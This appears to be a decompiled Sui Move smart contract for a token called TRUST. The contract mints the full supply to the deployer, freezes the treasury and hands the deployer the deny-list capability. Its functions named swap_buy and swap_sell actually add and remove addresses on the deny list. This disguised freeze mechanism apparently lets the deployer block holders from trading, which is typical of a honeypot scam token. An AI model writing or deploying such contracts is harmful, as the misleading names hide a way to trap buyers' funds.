module 0xc3e61b0fc34dbe76f1a67796d3bf83f6825eb157427a7478a2b3595a1d4daf19::trust {
    struct TRUST has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TRUST, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TRUST>(arg0, 9, b"trust", b"source: trust me bro", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSAZFd3t6i7AuZ6pc1P9qFeDH4xmXL3acvUe7tqooEHDR"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TRUST>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TRUST>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TRUST>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TRUST>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUST>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TRUST>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUST>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TRUST>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

